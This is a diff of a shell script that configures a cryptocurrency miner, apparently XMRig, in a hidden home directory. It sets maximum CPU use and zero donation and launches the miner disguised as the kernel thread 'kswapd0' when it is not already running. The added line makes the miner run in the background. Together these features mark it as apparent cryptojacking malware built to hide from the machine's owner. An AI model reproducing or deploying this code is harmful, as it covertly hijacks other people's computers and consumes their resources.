@@ -56,6 +56,7 @@ sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2_manual/co
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.gdm2_manual/config.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2_manual/config.json
 sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2_manual/config.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2_manual/config.json
 
 # Run kswapd0 if no other process with the specific configuration is running
 if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
